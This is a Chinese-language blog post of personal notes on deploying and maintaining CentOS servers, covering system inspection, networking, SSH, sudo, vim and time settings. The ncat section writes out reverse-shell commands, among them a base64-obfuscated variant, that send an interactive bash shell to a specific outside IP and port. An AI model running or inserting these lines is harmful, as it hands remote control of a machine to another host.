---
title: Linux服务器部署操作记录
date: 2022-10-28 17:57:47
category:
    - Linux
tag:
    - Linux
    - CentOS
    - 服务器部署
---


> 勤学如春起之苗，不见其增，日有所长；
>
> 辍学如磨刀之石，不见其损，日有所亏。
>
> 居安思危，生于忧患，死于安乐。



## 系统安装

### 版本选择

#### CentOS 6.5+

6.0发布时间：2011.07.04

CentOS-6维护期限：2020-11-30

（参考百度百科CentOS，维护期限可能会变动，看官方发布消息）

 

曾经的主流版本，部分中小公司服务器还在用，不建议入门使用这个版本，选择更高的版本，适应新的市场主流。工作中需要维护再查阅相关资料处理问题即可。

主流时间，通常是发行版上市一两年之后，系统稳定了，用的人就越来越多了。

过渡时间，发行版有一个系统维护支持的期限，期限快结束的一年左右，用户可能会开始向新版本迁移，或者直接使用新版本。



#### CentOS 7+

7.0发布时间：2014.07.07

CentOS-7维护期限：2024-06-30

 

2020年入门学习的话，选择CentOS-7的最新版就可以，大部分公司也正在使用这个版本，现在正是它的主流时期。



#### CentOS 8+

8.0发布时间：2019.09.25

CentOS-8维护期限：--



### 下载地址

#### 官网下载

https://www.centos.org/download/

国内网络的原因，网络可能很慢，镜像包可能下载不了。



#### 阿里云公开镜像资源下载

http://isoredirect.centos.org/centos/7/isos/x86_64/

http://mirrors.aliyun.com/centos/7/isos/x86_64/

http://mirrors.aliyun.com/centos/8/isos/x86_64/



### 安装方式

看个人需求，一般个人开发测试，使用虚拟机环境即可。

公司用服务器的话，也是直接买阿里的云服务器（Elastic Compute Service, 简称 ECS）或其他云服务器。



#### 直接在物理机上安装

**优势：**

对物理机配置要求不高。

节省主系统和虚拟机的性能开销。

 

**弊端：**

各种驱动服务可能存在问题，导致系统不能正常运行，或异常运行，反而浪费性能。

如果只有一台电脑，安装过程中遇到问题，需要用手机查找资料。

 

**适用场景：**

有多余闲置低配旧电脑。

想要折腾研究原始系统安装过程。



**参考：**

- [物理机安装linux系统（centos7.6）](https://www.cnblogs.com/zhuimengdeyuanyuan/p/13440561.html)
- [U盘安装centos7 记录](https://segmentfault.com/a/1190000012094459)
- [Centos 7.2基础安装和配置（含分区方案建议）](https://www.cnblogs.com/set-config/p/9040407.html)



#### 在虚拟机上安装

在虚拟机上安装，优劣势则恰好跟物理机安装相反。

[VMwear安装Centos7超详细过程](https://www.jianshu.com/p/ce08cdbc4ddb)



#### 初始创建用户

设置root用户密码

测试用的，简单点

 

创建新普通用户

云服务器，密码建议都设置强一点，定期（一个月+）修改一次，并即使关注异常登录状况。

root 组：





## 使用维护

### 认识使用

#### 查看系统信息

#####  [root@localhost ~]#

分别代表用户名（root），主机名（localhost），当前路径（~,当前用户的home目录），权限标志位（#代表root，$代表普通用户）



##### 查看当前 linux 的版本信息

```shell
# 查看发行版本
cat /etc/redhat-release
CentOS Linux release 7.9.2009 (Core)

# 查看内核版本
uname -r 显示操作系统的发行版号
3.10.0-1160.24.1.el7.x86_64

uname -a 显示系统名、节点名称、操作系统的发行版号、内核版本等
Linux iZwz9e8czk342iic7vuw8tZ 3.10.0-1160.24.1.el7.x86_64 #1 SMP Thu Apr 8 19:51:47 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux

```

```
系统名：
Linux

当前实例名称：
iZwz9e8czk342iic7vuw8tZ

操作系统的发行版号：
3.10.0-1160.24.1.el7.x86_64

命名规则：
主版本号：3
次版本号：10【奇数为开发版本，偶数为稳定版本】
修订版本号：0【修改的次数】
此次版本的第N次修改：957
el7:redhat enterprise linux 7
x86_64：编译框架(64位)

内核版本：
#1 SMP Tue Jun 18 16:35:19 UTC 2019

硬件平台：
x86_64

机器硬件名：
x86_64

系统处理器的体系结构：
x86_64

操作系统：
GNU/Linux

```



##### 查看 cpu、内存占用

top命令将会在当前终端以全屏交互式的界面显示进程排名，及时跟踪CPU、内存等系统资源占用情况，默认情况下每三秒刷新一次，其作用类似于windows系统中的任务管理器。



进入top后常用的内部指令：

```
h：帮助
M/shift+m：按内存排序
P/shift+p：按CPU排序
N/shift+n：按PID排序
<：向前；   >：向后
z：彩色显示

```



```shell
# 阿里云 ECS 服务器初始资源占用信息
[root@iZwz9e8czk342iic7vuw8tZ ~]# top
top - 21:43:08 up 38 min,  1 user,  load average: 0.00, 0.01, 0.02
Tasks:  79 total,   1 running,  78 sleeping,   0 stopped,   0 zombie
%Cpu(s):  0.2 us,  0.0 sy,  0.0 ni, 99.8 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
KiB Mem :  3733552 total,  3366660 free,   207436 used,   159456 buff/cache
KiB Swap:        0 total,        0 free,        0 used.  3327032 avail Mem 

  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND                                                        
 1089 root      10 -10  130528  12312   9584 S   0.3  0.3   0:09.57 AliYunDun                           
    1 root      20   0   43432   3820   2580 S   0.0  0.1   0:00.63 systemd                             
    2 root      20   0       0      0      0 S   0.0  0.0   0:00.00 kthreadd                             
    4 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 kworker/0:0H                         
    5 root      20   0       0      0      0 S   0.0  0.0   0:00.00 kworker/u4:0                         
    6 root      20   0       0      0      0 S   0.0  0.0   0:00.00 ksoftirqd/0                         
    7 root      rt   0       0      0      0 S   0.0  0.0   0:00.00 migration/0                         
    8 root      20   0       0      0      0 S   0.0  0.0   0:00.00 rcu_bh                               
    9 root      20   0       0      0      0 S   0.0  0.0   0:00.20 rcu_sched                           
   10 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 lru-add-drain                       
   11 root      rt   0       0      0      0 S   0.0  0.0   0:00.65 watchdog/0                           
   12 root      rt   0       0      0      0 S   0.0  0.0   0:00.00 watchdog/1                           
   13 root      rt   0       0      0      0 S   0.0  0.0   0:00.00 migration/1                         
   14 root      20   0       0      0      0 S   0.0  0.0   0:00.00 ksoftirqd/1                         
   16 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 kworker/1:0H                         
   18 root      20   0       0      0      0 S   0.0  0.0   0:00.00 kdevtmpfs                           
   19 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 netns                               
   20 root      20   0       0      0      0 S   0.0  0.0   0:00.00 khungtaskd                           
   21 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 writeback                           
   22 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 kintegrityd                         
   23 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 bioset                               
   24 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 bioset  
   
```



##### 查看 CPU 信息

```shell
grep "model name" /proc/cpuinfo
model name	: Intel(R) Xeon(R) Platinum 8269CY CPU @ 2.50GHz
model name	: Intel(R) Xeon(R) Platinum 8269CY CPU @ 2.50GHz

# 如果觉得需要看的更加舒服
grep "model name" /proc/cpuinfo | cut -f2 -d:
 Intel(R) Xeon(R) Platinum 8269CY CPU @ 2.50GHz
 Intel(R) Xeon(R) Platinum 8269CY CPU @ 2.50GHz

# 查看cpu是32位还是64位
getconf LONG_BIT
64

```



##### 查看内存、释放内存（缓存）

```shell
grep MemTotal /proc/meminfo | cut -f2 -d:
free -m 
free -m |grep "Mem" | awk '{print $2}'

Linux释放内存的命令：
sync # 同步一次数据，防止数据丢失
echo 1 > /proc/sys/vm/drop_caches

drop_caches的值可以是0-3之间的数字，代表不同的含义：
 0：不释放（系统默认值）
 1：释放页缓存
 2：释放dentries和inodes
 3：释放所有缓存

释放完内存后改回去让系统重新自动分配内存。 
echo 0 >/proc/sys/vm/drop_caches
free -m #看内存是否已经释放掉了。

如果需要释放所有缓存，就输入下面的命令： 
echo 3 > /proc/sys/vm/drop_caches

清除pagecache： echo 1 > /proc/sys/vm/drop_caches
清除回收slab分配器中的对象（包括目录项缓存和inode缓存）。slab分配器是内核中管理内存的一种机制，其中很多缓存数据实现都是用的pagecache： echo 2 > /proc/sys/vm/drop_caches
清除pagecache和slab分配器中的缓存对象： echo 3 > /proc/sys/vm/drop_caches


```



##### 查看 buff/cache 被哪些进程占用

```shell
wget https://silenceshell-1255345740.cos.ap-shanghai.myqcloud.com/hcache
chmod 755 hcache && mv hcache /usr/local/bin/

#hcache 常用命令
#全局显示10个最大的被缓存文件
sudo ./hcache -top 10

#定位到被缓存的最大文件后，然后可以使用lsof得到当前文件的一些进程信息
#lsof 缓存文件 
sudo lsof /var/log/journal/b2484c74346c44348d3a0db11e8da8d4/system.journal

#查看指定进程所使用的缓存使用情况
sudo ./hcache -pid 31840

```



##### 设置定时清除 buff/cache

https://www.tytrock.com/topics/286



```shell
用root用户创建定时任务

切换到root用户
su 

创建脚本文件
touch cleanCache.sh

编辑脚本文件
vim cleanCache.sh

添加如下内容：
#!/bin/bash#每两小时清除一次缓存
echo "开始清除缓存"
sync;sync;sync #写入硬盘，防止数据丢失
sleep 10#延迟10秒
echo 3 > /proc/sys/vm/drop_caches

创建定时任务
crontab -e  //弹出配置文件

添加如下内容：（每2小时执行一次，按需修改）
0 */2 * * * ./cleanCache.sh

保证crond启动以及开机自启
systemctl start crond.service
systemctl enable crond.service

查看buff/cache情况
free -m

查看定时任务是否被执行
cat /var/log/cron | grep cleanCache


```



##### 查看端口占用、解除端口占用
```shell
netstat [-acCeFghilMnNoprstuvVwx][-A<网络类型>][--ip]
```

参数说明：

```shell
netstat --help
-a或--all 显示所有连线中的Socket。
-A<网络类型>或--<网络类型> 列出该网络类型连线中的相关地址。
-c或--continuous 持续列出网络状态。
-C或--cache 显示路由器配置的快取信息。
-e或--extend 显示网络其他相关信息。
-F或--fib 显示路由缓存。
-g或--groups 显示多重广播功能群组组员名单。
-h或--help 在线帮助。
-i或--interfaces 显示网络界面信息表单。
-l或--listening 显示监控中的服务器的Socket。
-M或--masquerade 显示伪装的网络连线。
-n或--numeric 直接使用IP地址，而不通过域名服务器。
-N或--netlink或--symbolic 显示网络硬件外围设备的符号连接名称。
-o或--timers 显示计时器。
-p或--programs 显示正在使用Socket的程序识别码和程序名称。
-r或--route 显示Routing Table。
-s或--statistics 显示网络工作信息统计表。
-t或--tcp 显示TCP传输协议的连线状况。
-u或--udp 显示UDP传输协议的连线状况。
-v或--verbose 显示指令执行过程。
-V或--version 显示版本信息。
-w或--raw 显示RAW传输协议的连线状况。
-x或--unix 此参数的效果和指定"-A unix"参数相同。
--ip或--inet 此参数的效果和指定"-A inet"参数相同。

Centos查看端口占用情况命令，比如查看80端口占用情况使用如下命令：
lsof -i tcp:80

列出所有端口
netstat -ntlp

检查端口被哪个进程占用
netstat -lnp|grep 8080


```



**检查端口被哪个进程占用**

netstat -lnp|grep 88  #88请换为你的apache需要的端口，如：80

可以查看到88端口正在被哪个进程使用，比如占用的进程号为 1777

 

查看进程的详细信息

ps 1777

查看相应进程号的程序详细路径

 

杀掉进程，重新启动apache

kill -9 1777    #杀掉编号为1777的进程（请根据实际情况输入）

service httpd start #启动apache

如果没有问题，apache将可以正常启动。

 

Windows系统：

netstat -nao #会列出端口关联的的进程号，可以通过任务管理器查看是哪个任务

最后一列为程序PID，再通过tasklist命令：tasklist | findstr 2724

再通过任务管理结束掉这个程序就可以了。



##### 查看进程（指定排序字段）

ps命令是Linux系统中最为常见用的进程查看工具，主要用于显示包含当前运行的各进程完整信息的静态快照。通过不同的选项，可以有选择的查看进程信息。

```shell
a ：显示当前终端下的所有进程信息，包括其他用户的进程
u ：以用户为主的进程状态
x ：通常与 a 这个参数一起使用，显示当前用户在所有终端下的进程信息
-e ：显示系统内所有的进程信息
-l ：使用长格式显示进程信息
-f ：使用完整的格式显示进程信息

```



**以 docker 为例**

ps aux --sort %mem | head -10 # 按内存升序显示10条进程信息（-10前面有空格）。

ps aux --sort -%mem | head -10 # 按内存降序显示10条进程信息。

%mem 改为 %cpu 则为按 cpu 排序。



```
USER：运行进程的用户
PID：进程ID
%CPU：CPU占用率
%MEM：内存占用率
VSZ：占用虚拟内存
RSS：占用实际内存
TTY：进程运行的终端

STAT：进程状态
R-运行状态
S-可中断睡眠状态（Sleep）
D-不可中断睡眠状态
T-停止的进程 
Z-僵尸进程（zombie）
X-死掉的进程

START：进程的启动时间
TIME：进程占用CPU的总时间
COMMAND：进程文件，进程名
```



```shell
# 查看进程，并排序
[root@iZwz9e8czk342iic7vuw8tZ ~]# ps aux --sort -%mem|head -10
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root       859  0.0  0.5 574284 19440 ?        Ssl  21:04   0:00 /usr/bin/python2 -Es /usr/sbin/tuned -l -P
polkitd    540  0.0  0.3 612232 13144 ?        Ssl  21:04   0:00 /usr/lib/polkit-1/polkitd --no-debug
root      1089  0.4  0.3 130528 12312 ?        S<sl 21:04   0:11 /usr/local/aegis/aegis_client/aegis_10_93/AliYunDun
root       998  0.0  0.2 804704  9816 ?        Ssl  21:04   0:02 /usr/local/share/aliyun-assist/2.2.1.157/aliyun-service
root       994  0.0  0.2 218528  9152 ?        Ssl  21:04   0:00 /usr/sbin/rsyslogd -n
root       363  0.0  0.1  39056  5984 ?        Ss   21:04   0:00 /usr/lib/systemd/systemd-journald
root      1236  0.0  0.1 157512  5940 ?        Ss   21:41   0:00 sshd: root@pts/0
root      1038  0.0  0.1  41924  4308 ?        Ssl  21:04   0:02 /usr/local/aegis/aegis_update/AliYunDunUpdate
root      1003  0.0  0.1 112936  4296 ?        Ss   21:04   0:00 /usr/sbin/sshd -D


# 通过管道筛选进程名称
ps aux|grep docker


# 可以查看进程父子关系
ps -ef|grep docker


```



ps -elf 命令，将以长格式显示系统的进程信息，包含更丰富的内容。

![image-20210501215953831](https://www.m1yellow.cn/doc-img/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95.assets/ps-elf-detail.png)



##### pidstat

可以用来分析一个进程的IO,CUP，内存等情况

pidstat -u 进程号：CUP
pidstat -r 进程号：内存
pidstat -d 进程号：IO



##### 查看 ip、mac 地址

ifconfig 或 ip addr 可以查看ip和mac地址

 

cat /etc/sysconfig/network-scripts/ifcfg-eth0 

cat /etc/sysconfig/network-scripts/ifcfg-eth0 | grep IPADDR | cut -f2 -d=

ifconfig eth0 |grep "inet addr:" |awk '{print $2}'|cut -c 6-

ifconfig | grep 'inet addr:'| grep -v '127.0.0.1' | cut -d: -f2 | awk '{ print $1}'



##### 查看网关

```shell
cat /etc/sysconfig/network
# Created by cloud-init on instance boot automatically, do not edit.
# If you don't want cloud-init genrated automatically,you can disable it in /etc/cloud/cloud.cfg
# For more information, please refer to: https://help.aliyun.com/document_detail/57803.html
#
NETWORKING=yes

```



##### 查看 DNS

```shell
cat /etc/resolv.conf
nameserver 100.100.2.136
nameserver 100.100.2.138

```



##### 查看默认语言

```shell
echo $LANG $LANGUAGE
en_US.UTF-8

cat /etc/sysconfig/i18n
cat: /etc/sysconfig/i18n: No such file or directory

```



##### 查看主机名

```shell
hostname
iZwz9e8czk342iic7vuw8tZ

```



##### 查看开机时间多长

```shell
uptime
22:28:00 up  1:23,  1 user,  load average: 0.04, 0.03, 0.04

```



##### 查看开机启动项

```shell


```



##### 查看键盘布局

```shell
cat /etc/sysconfig/keyboard
cat /etc/sysconfig/keyboard | grep KEYTABLE | cut -f2 -d=
# No such file or directory

```



##### 初始使用系统性能
使用 top 命令查看


#### 使用准备

##### 设置命令行模式或图形界面模式

CentOS6修改方式：

vi /etc/inittab （文件修改需要权限）

最后一行，将原先的"id:5:initdefault:"中的5修改为3，即为默认首先启动命令界面，带网络的多用户界面。修改后，保存文件，重启即可生效。

 

CentOS7修改方式：

[CentOS7系统启动: 命令行模式-->图形界面模式](https://www.jianshu.com/p/b8ac516074c7)

 

以命令 systemctl get-default 可查看当前默认的模式。

 

\# 修改模式命令：

systemctl set-default graphical.target # 将默认模式修改为图形界面模式

systemctl set-default multi-user.target # 将默认模式修改为命令行模式



##### 配置网络网卡

以命令 cd /etc/sysconfig/network-scripts/ 进入network-scripts目录下，找到文件ifcfg-ens33(具体名字可能因系统不同而各异，如eth0、eth33...)，对该文件进行配置网卡信息。

 

以命令 vi ifcfg-ens33 打开网络配置文件，【INS】/【i】键进入编辑输入模式，在文件末尾加上（根据需要添加or变更，非必须）

 

\# 指定DNS服务器的IP地址，使其可正常解析域名，从而访问外网

DNS1=223.5.5.5

DNS2=8.8.8.8

 

\# 配置启动网络时，启动该设备

ONBOOT=yes

 

【ESC】键退出编辑模式，然后以命令 :wq 保存并退出该网络配置文件

 

重新加载网络配置文件，使得刚才的配置生效

操作命令：service network restart

 

ping一下，检查是否联通外网



> CentOS7 Failed to start LSB: Bring up/down networking

解决方式：禁用 NetworkManager

systemctl stop NetworkManager

systemctl disable NetworkManager

systemctl start network.service

systemctl status network.service



##### 设置静态固定IP

查看网卡配置

ifconfig 或者 ip addr

可能显示多个网卡，根据虚拟机联网的方式，比如桥接模式的话，则找到IP地址跟外部主机在同一网段的网卡，其他模式再找资料吧，

ens33: flags=4163\<UP,BROADCAST,RUNNING,MULTICAST\> mtu 1500

​    inet 192.168.1.106 netmask 255.255.255.0 broadcast 192.168.1.255

 

编辑网卡对应的配置文件

位于/etc/sysconfig/network-scripts/ifcfg-你的网卡名字

 

vi /etc/sysconfig/network-scripts/ifcfg-ens33

 

光标移动到”ONBOOT=no”这一行，更改为ONBOOT=yes

“BOOTPROTO=dhcp”，更改为BOOTPROTO="static"

 

按i进入编辑，新添加：

\#BROADCAST=192.168.1.255 广播可以不设置

IPADDR=192.168.31.147

NETMASK=255.255.255.0

GATEWAY=192.168.31.1

MACADDR=38:C9:86:2F:2C:42

 

\#DNS设置两个，不连外网可以不设置

DNS1=223.5.5.5

DNS2=8.8.8.8

 

按Esc退出当前编辑状态，再按“shift+:”输入w/wq/wq!保存修改，q为放弃修改

（按“i”键进入编辑模式，按“Esc”键退出编辑模式，在退出编辑模式时，按“zz”保存退出）

注意，文档在编辑状态或者退出编辑没关闭窗口状态，不能直接关掉窗口，进程还会在后台运行，占用内存，而且下次打开还会提醒文档已经被打开，还需要确认操作，所以，每次自己打开文件，不管有没有修改，都按“shift+:”保存或放弃。

 

重启网络配置

service network restart

 

DNS设置

不连外网可以不设置

vi /etc/resolv.conf

 

nameserver 223.5.5.5

nameserver 8.8.8.8



遇到的坑：

![image-20210502110431422](https://www.m1yellow.cn/doc-img/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95.assets/vmware-network-bridge.png)



选择桥接适配器的时候不能用自动，别照着网上选了什么“Realtek”的有线网卡，要选自己用的无线网卡适配器，结果折腾了很久。



##### 无线网卡设置静态IP

- [CentOS 配置无线网络，开启wifi](https://www.cnblogs.com/asker009/p/10212045.html)
- [NetworkManager命令行配置](https://huataihuang.gitbooks.io/cloud-atlas/content/os/linux/redhat/system_administration/network/networkmanager_nmcli.html)





##### 开启SSH远程登录

> 阿里或其他云服务器，默认开启了 SSH 服务

[Centos7开启SSH服务](https://blog.csdn.net/qq_36663951/article/details/79813038)

1、 首先，要确保CentOS7安装了openssh-server，在终端中输入yum list installed | grep openssh-server

此处显示已经安装了 openssh-server，如果又没任何输出显示表示没有安装 openssh-server，通过输入 yum install openssh-server

来进行安装openssh-server

2、 找到了 /etc/ssh/ 目录下的sshd服务配置文件 sshd_config，用Vim编辑器打开

将文件中，关于监听端口、监听地址前的 # 号去除

然后开启允许远程登录

最后，开启使用用户名密码来作为连接验证

保存文件，退出

3、 开启 sshd 服务，输入 sudo service sshd start

检查 sshd 服务是否已经开启，输入ps -e | grep sshd

或者输入netstat -an | grep 22 检查 22 号端口是否开启监听

4、 在Vmware Workstation中，查看CentOS7的属性，发现网络连接方式是采用的 NAT 方式连接的

5、 在Vmware Workstation中，点击编辑=》虚拟网络编辑器，进入虚拟网络编辑器，查看发现 NAT 模式的连接采用的网络适配器名称为VMnet8

6、在 windows 主机中，在命令行中输入ipconfig 查看主机IP，找到 VMnet8 的连接信息，此处 ip 为192.168.30.1

7、在CentOS中，输入ifconfig查看网络连接地址，发现CentOS的网络地址为192.168.112.128

8、在CentOS中，输入ping 192.168.30.1 测试是否能连通主机，发现可以连通

9、在主机中，输入 ping 192.168.112.128，测试主机是否能连通CentOS，发现连不通

如果可以连得通，可以直接跳至第12 步

10、在主机，打开网络配置，选择网络适配器 VMnet8 的 TCP/IPv4  的属性，进行一下网络配置

要求子网掩码、默认网关均和CentOS一致，并将IP地址修改为 192.168.112.1，即保证主机的 IP 和 CentOS 的 IP 在同一网络区段中

11、再在主机中，输入 ping 192.168.112.128，已经可以连接得通了

12、在SSH工具（此处使用的XShell）中，新建连接，输入 CentOS 的IP地址、用户名、密码即可连接成功

13、为了免去每次开启 CentOS 时，都要手动开启 sshd 服务，可以将 sshd 服务添加至自启动列表中，输入systemctl enable sshd.service

可以通过输入systemctl list-unit-files | grep sshd，查看是否开启了sshd 服务自启动

 

https://www.cnblogs.com/jike369/articles/6971314.html

[centos 6.5下安装、配置并启动SSH远程访问](file:///E:/工作技术领域/工作资料/【参考资料】/%2301-技术书籍资料/Linux/%2300-技术资料参考/Linux服务器部署/centos 6.5下安装、配置并启动SSH远程访问.pdf)

登录centos 6.5系统，使用root用户登录，如果为非root用户则执行su或su - 或su root或su - root切换为root用户；

查看SSH是否安装（检查是否装了SSH包），输入命令：rpm -qa | grep ssh，如显示ssh相关软件版本，则说明centos 6.5系统已经为我们默认安装了SSH包；

查看SSH服务是否正在运行。输入命令：/etc/init.d/sshd status，会显示运行状态；

若centos 6.5系统中SSH服务处于非运行状态则使用（service sshd start）命令开启SSH服务；停止SSH服务命令（service sshd stop）；重启SSH服务命令（service sshd restart）。为了演示效果，我这里先停止SSH服务，然后启动SSH服务，再接着重启SSH服务。[service sshd stop] -> [/etc/init.d/sshd status] -> [service sshd start]-> [service sshd restart] ->[重启后可输入：netstat -antp | grep sshd 查看是否启动22端口]

检查SSHD是否在本运行级别下设置为开机启动。输入命令：chkconfig --list sshd，如2345状态为on，则centos 6.5系统中SSH服在本运行级别下已经设置为开机启动,如果没设置启动就使用如下命令[chkconfig --level 2345 sshd on]设置下即可。

设置SSH服务为开机启动。输入命令：chkconfig sshd on 即可。注：若是chkconfig sshd off则禁止SSH开机启动。

下载xshell工具，新建连接。



##### 普通用户配置 sudo 免密

vim /etc/sudoers 修改配置文件，将下列第三或第四行添加到文件中：

 

youuser ALL=(ALL) ALL

%youuser ALL=(ALL) ALL

youuser ALL=(ALL) NOPASSWD: ALL

%youuser ALL=(ALL) NOPASSWD: ALL

 

第一行：允许用户youuser执行sudo命令(需要输入密码)。

第二行：允许用户组youuser里面的用户执行sudo命令(需要输入密码)。

第三行：允许用户youuser执行sudo命令,并且在执行的时候不输入密码。

第四行：允许用户组youuser里面的用户执行sudo命令,并且在执行的时候不输入密码。

 

例如：

\# Allow root to run any commands anywhere

root    ALL=(ALL)       ALL
dvlp   ALL=(ALL)       NOPASSWD: ALL
%dvlp   ALL=(ALL)      NOPASSWD: ALL



验证 sudo 身份

sudo cat /etc/sudoers

输入一次密码之后，后续 sudo 就免密了



##### 开启SSH免密登录

\# 注意请务必要将服务器上

~/.ssh权限设置为700

~/.ssh/authorized_keys的权限设置为600

\# 这是linux的安全要求，如果权限不对，自动登录将不会生效！

 

xshell 远程登陆CentOS7 免密登陆

https://www.cnblogs.com/jacob-08-19/p/11830483.html

xshell先用用户名、密码登录

使用xshell生成秘钥，xshell -工具-**用户秘钥管理者**，在右侧选项行中选择“生成”，密钥类型和长度默认，生成公钥对，密钥名称随意起，**密钥的加密密码**（给密钥加密用的，不是登录密码哦）测试环境或个人测试可以不设置，避免后续忘记密码麻烦。正式环境需要设置，密码记下来就行。

接着往下操作，保存公钥文件

将保存下来的公钥文件上传到服务器中的.ssh文件夹中

最后将公钥中的内容添加到 authorized_keys中（authorized_keys存储公钥），cat test.pub >> authorized_keys，如果有多个公钥内容，**记住要换行**，否则不能识别

 

##### 安装 vim

- [Linux（centos）安装vim](https://www.cnblogs.com/Jason-Xiang/p/11750846.html)



```shell
#检查是否已安装
rpm -qa|grep vim

#如果已安装，会显示：
[root@localhost usr]# rpm -qa|grep vim
vim-minimal-7.4.629-6.el7.x86_64
vim-filesystem-7.4.629-6.el7.x86_64
vim-enhanced-7.4.629-6.el7.x86_64
vim-common-7.4.629-6.el7.x86_64
vim-X11-7.4.629-6.el7.x86_64

如果缺少了其中某个，比如说： vim-enhanced这个包少了，则执行：

yum -y install vim-enhanced
它会自动下载安装。如果上面三个包一个都没有显示，则直接输入命令：   

yum -y install vim*
执行命令后会自动安装，完毕后就可以使用vim编辑器了。

安装完成后开始配置vim

vim /etc/vimrc
打开文件后，按 i 进入编辑模式，然后找一个位置添加如下代码

set nu          " 设置显示行号
set showmode    " 设置在命令行界面最下面显示当前模式等
set ruler       " 在右下角显示光标所在的行数等信息
set autoindent  " 设置每次单击Enter键后，光标移动到下一行时与上一行的起始字符对齐
syntax on       " 即设置语法检测，当编辑C或者Shell脚本时，关键字会用特殊颜色显示

添加好了之后，按Esc，然后输入
:wq

退出并保存即可。

vim 取消搜索高亮
在Vi里面如果要搜索某个关键字，只要键入/xxx就可以了，比如，要搜索一个函数，就键入/snprintf
然后回车，一个文件中，所有出现这个字样的地方都会被高亮显示。按n键，就可以自动把光标跳到下一个。
消除高亮：键入:noh就可以了。


```



##### 安装 wget

```shell
sudo yum install wget

```



##### 安装 ncat

```shell
yum install -y nc

#攻击机使用nc监听
nc -nvlp 4444

-n: 不反向解析dns，即不通过ip解析域名 no dns
-v: 详细信息输出 verbose
-l: 监听 listen
-p: 指定端口 port

#bash反弹
bash -i >& /dev/tcp/攻击机ip/攻击机port 0>&1
bash -i >& /dev/tcp/8.129.220.131/4444 0>&1

#base64版
#在线编码地址：http://www.jackson-t.ca/runtime-exec-payloads.html
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEyOS4yMjAuMTMxLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}

#其他版本
/bin/bash -i > /dev/tcp/8.129.220.131/4444 0<& 2>&1
exec /bin/sh 0</dev/tcp/8.129.220.131/4444 1>&0 2>&0
0<&196;exec 196<>/dev/tcp/8.129.220.131/4444; sh <&196 >&196 2>&196


bash -i：交互式shell
>& :输入输出重定向：0 stdin, 1 stdout, 2 stderr
/dev/tcp/ip/port: 特殊文件

注: /dev/tcp/ 是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。


```



##### CentOS 配置无线网络，开启wifi

- [CentOS 配置无线网络，开启wifi](https://www.cnblogs.com/asker009/p/10212045.html)



##### 设置笔记本合盖不休眠

```shell
vim /etc/systemd/logind.conf

HandlePowerKey 按下电源键后的行为，默认power off
HandleSleepKey 按下挂起键后的行为，默认suspend
HandleHibernateKey 按下休眠键后的行为，默认hibernate
HandleLidSwitch 合上笔记本盖后的行为，默认suspend

把HandleLidSwitch后面的suspend修改为lock，去掉前面的注释#
HandleLidSwitch=lock

配置项的可选范围为：
ignore 忽略，跳过
power off 关机
eboot 重启
halt 挂起
suspend shell内建指令，可暂停目前正在执行的shell。若要恢复，则必须使用SIGCONT信息。所有的进程都会暂停，但不是消失（halt是进程关闭）
hibernate 让笔记本进入休眠状态
hybrid-sleep 混合睡眠，主要是为台式机设计的，是睡眠和休眠的结合体，当你选择Hybird时，系统会像休眠一样把内存里的数据从头到尾复制到硬盘里 ，然后进入睡眠状态，即内存和CPU还是活动的，其他设置不活动，这样你想用电脑时就可以快速恢复到之前的状态了，笔记本一般不用这个功能。
lock 仅锁屏，计算机继续工作。

systemctl restart systemd-logind

```



#### 系统时间设置

##### 查看当前时间

```shell
[root@iZwz9e8czk342iic7vuw8tZ ~]# date
Sun May  2 11:11:59 CST 2021

```



##### 修改日期时间

```shell
# 查看时区
timedatectl list-timezones

# 修改时区为上海
timedatectl set-timezone Asia/Shanghai

# 使用创建链接的方式更改时区
如果运行的是旧版本的Centos，比如Centos6之前的版本，并且系统上不存在timedatectl命令，则可以通过将/etc/localtime符号链接到/usr/share/zoneinfo目录中的时区文件来更改时区。

查看一下/usr/share/zoninfo下面的时区文件
[root@localhost ~]# ls /usr/share/zoneinfo/
[root@localhost ~]# ls /usr/share/zoneinfo/Asia/

ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime


# jre是从/etc/sysconfig/clock这个文件中获取时区信息的，修改次文件即可，没有的话添加一个。 附clock文件内容：
ZONE="Asia/Shanghai"
UTC=false
ARC=false

# 直接在/etc/sysconfig/下新建一个clock（如果没有的话）
touch clock

# 手动修改时间
date -s "2021-05-02 12:00:00"

# 修改硬件时间
查看硬件时间
hwclock --show

修改硬件时间
hwclock --set --date "2021-05-02 12:00:00"

同步系统时间和硬件时间
hwclock -s(--hctosys)
保存时钟
clock -w
重启系统
reboot 或 init 6

```



##### 同步时间

```shell
# Debian/Ubunut
apt-get install ntpdate

# CentOS
yum install ntp

# 执行同步
ntpdate cn.pool.ntp.org

```



#### 系统存储设置

##### 查看硬盘和分区

```shell
df -h
fdisk -l

# df -T可以查看文件系统类型


# 查看当前目录每个目录以及文件大小
du -sh ./*

# 查看指定目录的大小
du /etc -sh

```



##### 格式化和挂载数据盘





##### 分区存储空间扩容

> XFTP上传文件出现：unknown error的解决方法
>
> 问题现象：
> 上传文件到服务器通过Xftp，提示进度100%，或者小于100%，点开错误提示：unknown error。
>
> 能正常上传，传到一定大小，就报错了，一开始以为是目录权限问题，但之前都能上传。后面又怀疑是软件问题，有功能限制，差点没卸载重装软件。
>
> 就在要重装软件之前，最后再搜索了 `xftp unknown error`，再找了几篇博客，还真看到问题真正的原因了。
>
